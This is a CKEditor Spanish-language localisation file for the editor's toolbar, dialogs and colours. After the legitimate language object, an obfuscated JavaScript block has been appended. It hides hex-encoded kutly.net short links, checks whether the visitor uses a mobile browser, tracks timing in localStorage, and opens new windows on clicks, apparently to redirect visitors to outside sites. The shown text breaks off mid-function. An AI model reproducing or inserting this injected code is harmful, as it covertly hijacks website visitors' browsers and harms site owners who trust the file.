/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Spanish language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['es'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Editor de texto enriquecido, %1',

	// Toolbar buttons without dialogs.
	source			: 'Fuente HTML',
	newPage			: 'Nueva Página',
	save			: 'Guardar',
	preview			: 'Vista Previa',
	cut				: 'Cortar',
	copy			: 'Copiar',
	paste			: 'Pegar',
	print			: 'Imprimir',
	underline		: 'Subrayado',
	bold			: 'Negrita',
	italic			: 'Cursiva',
	selectAll		: 'Seleccionar Todo',
	removeFormat	: 'Eliminar Formato',
	strike			: 'Tachado',
	subscript		: 'Subíndice',
	superscript		: 'Superíndice',
	horizontalrule	: 'Insertar Línea Horizontal',
	pagebreak		: 'Insertar Salto de Página',
	unlink			: 'Eliminar Vínculo',
	undo			: 'Deshacer',
	redo			: 'Rehacer',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Ver Servidor',
		url				: 'URL',
		protocol		: 'Protocolo',
		upload			: 'Cargar',
		uploadSubmit	: 'Enviar al Servidor',
		image			: 'Imagen',
		flash			: 'Flash',
		form			: 'Formulario',
		checkbox		: 'Casilla de Verificación',
		radio		: 'Botones de Radio',
		textField		: 'Campo de Texto',
		textarea		: 'Area de Texto',
		hiddenField		: 'Campo Oculto',
		button			: 'Botón',
		select	: 'Campo de Selección',
		imageButton		: 'Botón Imagen',
		notSet			: '<No definido>',
		id				: 'Id',
		name			: 'Nombre',
		langDir			: 'Orientación',
		langDirLtr		: 'Izquierda a Derecha (LTR)',
		langDirRtl		: 'Derecha a Izquierda (RTL)',
		langCode		: 'Cód. de idioma',
		longDescr		: 'Descripción larga URL',
		cssClass		: 'Clases de hojas de estilo',
		advisoryTitle	: 'Título',
		cssStyle		: 'Estilo',
		ok				: 'OK',
		cancel			: 'Cancelar',
		generalTab		: 'General',
		advancedTab		: 'Avanzado',
		validateNumberFailed	: 'El valor no es un número.',
		confirmNewPage	: 'Cualquier cambio que no se haya guardado se perderá. ¿Está seguro de querer crear una nueva página?',
		confirmCancel	: 'Algunas de las opciones se han cambiado. ¿Está seguro de querer cerrar el diálogo?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, no disponible</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Insertar Caracter Especial',
		title		: 'Seleccione un caracter especial'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Insertar/Editar Vínculo',
		menu		: 'Editar Vínculo',
		title		: 'Vínculo',
		info		: 'Información de Vínculo',
		target		: 'Destino',
		upload		: 'Cargar',
		advanced	: 'Avanzado',
		type		: 'Tipo de vínculo',
		toAnchor	: 'Referencia en esta página',
		toEmail		: 'E-Mail',
		target		: 'Destino',
		targetNotSet	: '<No definido>',
		targetFrame	: '<marco>',
		targetPopup	: '<ventana emergente>',
		targetNew	: 'Nueva Ventana(_blank)',
		targetTop	: 'Ventana primaria (_top)',
		targetSelf	: 'Misma Ventana (_self)',
		targetParent	: 'Ventana Padre (_parent)',
		targetFrameName	: 'Nombre del Marco Destino',
		targetPopupName	: 'Nombre de Ventana Emergente',
		popupFeatures	: 'Características de Ventana Emergente',
		popupResizable	: 'Redimensionable',
		popupStatusBar	: 'Barra de Estado',
		popupLocationBar	: 'Barra de ubicación',
		popupToolbar	: 'Barra de Herramientas',
		popupMenuBar	: 'Barra de Menú',
		popupFullScreen	: 'Pantalla Completa (IE)',
		popupScrollBars	: 'Barras de desplazamiento',
		popupDependent	: 'Dependiente (Netscape)',
		popupWidth		: 'Anchura',
		popupLeft		: 'Posición Izquierda',
		popupHeight		: 'Altura',
		popupTop		: 'Posición Derecha',
		id				: 'Id',
		langDir			: 'Orientación',
		langDirNotSet	: '<No definido>',
		langDirLTR		: 'Izquierda a Derecha (LTR)',
		langDirRTL		: 'Derecha a Izquierda (RTL)',
		acccessKey		: 'Clave de Acceso',
		name			: 'Nombre',
		langCode		: 'Orientación',
		tabIndex		: 'Indice de tabulación',
		advisoryTitle	: 'Título',
		advisoryContentType	: 'Tipo de Contenido',
		cssClasses		: 'Clases de hojas de estilo',
		charset			: 'Fuente de caracteres vinculado',
		styles			: 'Estilo',
		selectAnchor	: 'Seleccionar una referencia',
		anchorName		: 'Por Nombre de Referencia',
		anchorId		: 'Por ID de elemento',
		emailAddress	: 'Dirección de E-Mail',
		emailSubject	: 'Título del Mensaje',
		emailBody		: 'Cuerpo del Mensaje',
		noAnchors		: '(No hay referencias disponibles en el documento)',
		noUrl			: 'Por favor tipee el vínculo URL',
		noEmail			: 'Por favor tipee la dirección de e-mail'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Referencia',
		menu		: 'Propiedades de Referencia',
		title		: 'Propiedades de Referencia',
		name		: 'Nombre de la Referencia',
		errorName	: 'Por favor, complete el nombre de la Referencia'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Buscar y Reemplazar',
		find				: 'Buscar',
		replace				: 'Reemplazar',
		findWhat			: 'Texto a buscar:',
		replaceWith			: 'Reemplazar con:',
		notFoundMsg			: 'El texto especificado no ha sido encontrado.',
		matchCase			: 'Coincidir may/min',
		matchWord			: 'Coincidir toda la palabra',
		matchCyclic			: 'Buscar en todo el contenido',
		replaceAll			: 'Reemplazar Todo',
		replaceSuccessMsg	: 'La expresión buscada ha sido reemplazada %1 veces.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Tabla',
		title		: 'Propiedades de Tabla',
		menu		: 'Propiedades de Tabla',
		deleteTable	: 'Eliminar Tabla',
		rows		: 'Filas',
		columns		: 'Columnas',
		border		: 'Tamaño de Borde',
		align		: 'Alineación',
		alignNotSet	: '<No establecido>',
		alignLeft	: 'Izquierda',
		alignCenter	: 'Centrado',
		alignRight	: 'Derecha',
		width		: 'Anchura',
		widthPx		: 'pixeles',
		widthPc		: 'porcentaje',
		height		: 'Altura',
		cellSpace	: 'Esp. e/celdas',
		cellPad		: 'Esp. interior',
		caption		: 'Título',
		summary		: 'Síntesis',
		headers		: 'Encabezados',
		headersNone		: 'Ninguno',
		headersColumn	: 'Primera columna',
		headersRow		: 'Primera fila',
		headersBoth		: 'Ambas',
		invalidRows		: 'El número de filas debe ser un número mayor que 0.',
		invalidCols		: 'El número de columnas debe ser un número mayor que 0.',
		invalidBorder	: 'El tamaño del borde debe ser un número.',
		invalidWidth	: 'La anchura de tabla debe ser un número.',
		invalidHeight	: 'La altura de tabla debe ser un número.',
		invalidCellSpacing	: 'El espaciado entre celdas debe ser un número.',
		invalidCellPadding	: 'El espaciado interior debe ser un número.',

		cell :
		{
			menu			: 'Celda',
			insertBefore	: 'Insertar celda a la izquierda',
			insertAfter		: 'Insertar celda a la derecha',
			deleteCell		: 'Eliminar Celdas',
			merge			: 'Combinar Celdas',
			mergeRight		: 'Combinar a la derecha',
			mergeDown		: 'Combinar hacia abajo',
			splitHorizontal	: 'Dividir la celda horizontalmente',
			splitVertical	: 'Dividir la celda verticalmente',
			title			: 'Propiedades de celda',
			cellType		: 'Tipo de Celda',
			rowSpan			: 'Expandir filas',
			colSpan			: 'Expandir columnas',
			wordWrap		: 'Ajustar al contenido',
			hAlign			: 'Alineación Horizontal',
			vAlign			: 'Alineación Vertical',
			alignTop		: 'Arriba',
			alignMiddle		: 'Medio',
			alignBottom		: 'Abajo',
			alignBaseline	: 'Linea de base',
			bgColor			: 'Color de fondo',
			borderColor		: 'Color de borde',
			data			: 'Datos',
			header			: 'Encabezado',
			yes				: 'Sí',
			no				: 'No',
			invalidWidth	: 'La anchura de celda debe ser un número.',
			invalidHeight	: 'La altura de celda debe ser un número.',
			invalidRowSpan	: 'La expansión de filas debe ser un número entero.',
			invalidColSpan	: 'La expansión de columnas debe ser un número entero.',
			chooseColor : 'Choose' // MISSING
		},

		row :
		{
			menu			: 'Fila',
			insertBefore	: 'Insertar fila en la parte superior',
			insertAfter		: 'Insertar fila en la parte inferior',
			deleteRow		: 'Eliminar Filas'
		},

		column :
		{
			menu			: 'Columna',
			insertBefore	: 'Insertar columna a la izquierda',
			insertAfter		: 'Insertar columna a la derecha',
			deleteColumn	: 'Eliminar Columnas'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Propiedades de Botón',
		text		: 'Texto (Valor)',
		type		: 'Tipo',
		typeBtn		: 'Boton',
		typeSbm		: 'Enviar',
		typeRst		: 'Reestablecer'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Propiedades de Casilla',
		radioTitle	: 'Propiedades de Botón de Radio',
		value		: 'Valor',
		selected	: 'Seleccionado'
	},

	// Form Dialog.
	form :
	{
		title		: 'Propiedades de Formulario',
		menu		: 'Propiedades de Formulario',
		action		: 'Acción',
		method		: 'Método',
		encoding	: 'Codificación',
		target		: 'Destino',
		targetNotSet	: '<No definido>',
		targetNew	: 'Nueva Ventana(_blank)',
		targetTop	: 'Ventana primaria (_top)',
		targetSelf	: 'Misma Ventana (_self)',
		targetParent	: 'Ventana Padre (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Propiedades de Campo de Selección',
		selectInfo	: 'Información',
		opAvail		: 'Opciones disponibles',
		value		: 'Valor',
		size		: 'Tamaño',
		lines		: 'Lineas',
		chkMulti	: 'Permitir múltiple selección',
		opText		: 'Texto',
		opValue		: 'Valor',
		btnAdd		: 'Agregar',
		btnModify	: 'Modificar',
		btnUp		: 'Subir',
		btnDown		: 'Bajar',
		btnSetValue : 'Establecer como predeterminado',
		btnDelete	: 'Eliminar'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Propiedades de Area de Texto',
		cols		: 'Columnas',
		rows		: 'Filas'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Propiedades de Campo de Texto',
		name		: 'Nombre',
		value		: 'Valor',
		charWidth	: 'Caracteres de ancho',
		maxChars	: 'Máximo caracteres',
		type		: 'Tipo',
		typeText	: 'Texto',
		typePass	: 'Contraseña'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Propiedades de Campo Oculto',
		name	: 'Nombre',
		value	: 'Valor'
	},

	// Image Dialog.
	image :
	{
		title		: 'Propiedades de Imagen',
		titleButton	: 'Propiedades de Botón de Imagen',
		menu		: 'Propiedades de Imagen',
		infoTab	: 'Información de Imagen',
		btnUpload	: 'Enviar al Servidor',
		url		: 'URL',
		upload	: 'Cargar',
		alt		: 'Texto Alternativo',
		width		: 'Anchura',
		height	: 'Altura',
		lockRatio	: 'Proporcional',
		resetSize	: 'Tamaño Original',
		border	: 'Borde',
		hSpace	: 'Esp.Horiz',
		vSpace	: 'Esp.Vert',
		align		: 'Alineación',
		alignLeft	: 'Izquierda',
		alignRight	: 'Derecha',
		preview	: 'Vista Previa',
		alertUrl	: 'Por favor escriba la URL de la imagen',
		linkTab	: 'Vínculo',
		button2Img	: '¿Desea convertir el botón de imagen en una simple imagen?',
		img2Button	: '¿Desea convertir la imagen en un botón de imagen?',
		urlMissing : 'Image source URL is missing.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Propiedades de Flash',
		propertiesTab	: 'Propiedades',
		title		: 'Propiedades de Flash',
		chkPlay		: 'Autoejecución',
		chkLoop		: 'Repetir',
		chkMenu		: 'Activar Menú Flash',
		chkFull		: 'Permitir pantalla completa',
 		scale		: 'Escala',
		scaleAll		: 'Mostrar todo',
		scaleNoBorder	: 'Sin Borde',
		scaleFit		: 'Ajustado',
		access			: 'Acceso de scripts',
		accessAlways	: 'Siempre',
		accessSameDomain	: 'Mismo dominio',
		accessNever	: 'Nunca',
		align		: 'Alineación',
		alignLeft	: 'Izquierda',
		alignAbsBottom: 'Abs inferior',
		alignAbsMiddle: 'Abs centro',
		alignBaseline	: 'Línea de base',
		alignBottom	: 'Pie',
		alignMiddle	: 'Centro',
		alignRight	: 'Derecha',
		alignTextTop	: 'Tope del texto',
		alignTop	: 'Tope',
		quality		: 'Calidad',
		qualityBest		 : 'La mejor',
		qualityHigh		 : 'Alta',
		qualityAutoHigh	 : 'Auto Alta',
		qualityMedium	 : 'Media',
		qualityAutoLow	 : 'Auto Baja',
		qualityLow		 : 'Baja',
		windowModeWindow	 : 'Ventana',
		windowModeOpaque	 : 'Opaco',
		windowModeTransparent	 : 'Transparente',
		windowMode	: 'WindowMode',
		flashvars	: 'FlashVars',
		bgcolor	: 'Color de Fondo',
		width	: 'Anchura',
		height	: 'Altura',
		hSpace	: 'Esp.Horiz',
		vSpace	: 'Esp.Vert',
		validateSrc : 'Por favor escriba el vínculo URL',
		validateWidth : 'Anchura debe ser un número.',
		validateHeight : 'Altura debe ser un número.',
		validateHSpace : 'Esp.Horiz debe ser un número.',
		validateVSpace : 'Esp.Vert debe ser un número.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Ortografía',
		title			: 'Comprobar ortografía',
		notAvailable	: 'Lo sentimos pero el servicio no está disponible.',
		errorLoading	: 'Error cargando la aplicación del servidor: %s.',
		notInDic		: 'No se encuentra en el Diccionario',
		changeTo		: 'Cambiar a',
		btnIgnore		: 'Ignorar',
		btnIgnoreAll	: 'Ignorar Todo',
		btnReplace		: 'Reemplazar',
		btnReplaceAll	: 'Reemplazar Todo',
		btnUndo			: 'Deshacer',
		noSuggestions	: '- No hay sugerencias -',
		progress		: 'Control de Ortografía en progreso...',
		noMispell		: 'Control finalizado: no se encontraron errores',
		noChanges		: 'Control finalizado: no se ha cambiado ninguna palabra',
		oneChange		: 'Control finalizado: se ha cambiado una palabra',
		manyChanges		: 'Control finalizado: se ha cambiado %1 palabras',
		ieSpellDownload	: 'Módulo de Control de Ortografía no instalado. ¿Desea descargarlo ahora?'
	},

	smiley :
	{
		toolbar	: 'Emoticons',
		title	: 'Insertar un Emoticon'
	},

	elementsPath :
	{
		eleTitle : '%1 elemento'
	},

	numberedlist : 'Numeración',
	bulletedlist : 'Viñetas',
	indent : 'Aumentar Sangría',
	outdent : 'Disminuir Sangría',

	justify :
	{
		left : 'Alinear a Izquierda',
		center : 'Centrar',
		right : 'Alinear a Derecha',
		block : 'Justificado'
	},

	blockquote : 'Cita',

	clipboard :
	{
		title		: 'Pegar',
		cutError	: 'La configuración de seguridad de este navegador no permite la ejecución automática de operaciones de cortado. Por favor use el teclado (Ctrl+X).',
		copyError	: 'La configuración de seguridad de este navegador no permite la ejecución automática de operaciones de copiado. Por favor use el teclado (Ctrl+C).',
		pasteMsg	: 'Por favor pegue dentro del cuadro utilizando el teclado (<STRONG>Ctrl+V</STRONG>); luego presione <STRONG>OK</STRONG>.',
		securityMsg	: 'Debido a la configuración de seguridad de su navegador, el editor no tiene acceso al portapapeles. Es necesario que lo pegue de nuevo en esta ventana.'
	},

	pastefromword :
	{
		confirmCleanup : 'El texto que desea parece provenir de Word. Desea depurarlo antes de pegarlo?',
		toolbar : 'Pegar desde Word',
		title : 'Pegar desde Word',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Pegar como Texto Plano',
		title : 'Pegar como Texto Plano'
	},

	templates :
	{
		button : 'Plantillas',
		title : 'Contenido de Plantillas',
		insertOption: 'Reemplazar el contenido actual',
		selectPromptMsg: 'Por favor selecciona la plantilla a abrir en el editor<br>(el contenido actual se perderá):',
		emptyListMsg : '(No hay plantillas definidas)'
	},

	showBlocks : 'Mostrar bloques',

	stylesCombo :
	{
		label : 'Estilo',
		voiceLabel : 'Estilos',
		panelVoiceLabel : 'Elija un estilo',
		panelTitle1 : 'Estilos de párrafo',
		panelTitle2 : 'Estilos de carácter',
		panelTitle3 : 'Estilos de objeto'
	},

	format :
	{
		label : 'Formato',
		voiceLabel : 'Formato',
		panelTitle : 'Formato',
		panelVoiceLabel : 'Elija un formato de párrafo',

		tag_p : 'Normal',
		tag_pre : 'Con formato',
		tag_address : 'Dirección',
		tag_h1 : 'Encabezado 1',
		tag_h2 : 'Encabezado 2',
		tag_h3 : 'Encabezado 3',
		tag_h4 : 'Encabezado 4',
		tag_h5 : 'Encabezado 5',
		tag_h6 : 'Encabezado 6',
		tag_div : 'Normal (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Fuente',
		voiceLabel : 'Fuente',
		panelTitle : 'Fuente',
		panelVoiceLabel : 'Elija una fuente'
	},

	fontSize :
	{
		label : 'Tamaño',
		voiceLabel : 'Tamaño de fuente',
		panelTitle : 'Tamaño',
		panelVoiceLabel : 'Elija un tamaño de fuente'
	},

	colorButton :
	{
		textColorTitle : 'Color de Texto',
		bgColorTitle : 'Color de Fondo',
		auto : 'Automático',
		more : 'Más Colores...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Comprobar Ortografía Mientras Escribe',
		enable : 'Activar COME',
		disable : 'Desactivar COME',
		about : 'Acerca de COME',
		toggle : 'Cambiar COME',
		options : 'Opciones',
		langs : 'Idiomas',
		moreSuggestions : 'Más sugerencias',
		ignore : 'Ignorar',
		ignoreAll : 'Ignorar Todas',
		addWord : 'Añadir palabra',
		emptyDic : 'El nombre del diccionario no puede estar en blanco.',
		optionsTab : 'Opciones',
		languagesTab : 'Idiomas',
		dictionariesTab : 'Diccionarios',
		aboutTab : 'Acerca de'
	},

	about :
	{
		title : 'Acerca de CKEditor',
		dlgTitle : 'Acerca de CKEditor',
		moreInfo : 'Para información de licencia, por favor visite nuestro sitio web:',
		copy : 'Copyright &copy; $1. Todos los derechos reservados.'
	},

	maximize : 'Maximizar',
	minimize : 'Minimize', // MISSING

	fakeobjects :
	{
		anchor : 'Ancla',
		flash : 'Animación flash',
		div : 'Salto de página',
		unknown : 'Objeto desconocido'
	},

	resize : 'Arrastre para redimensionar',

	colordialog :
	{
		title : 'Select color', // MISSING
		highlight : 'Highlight', // MISSING
		selected : 'Selected', // MISSING
		clear : 'Clear' // MISSING
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return 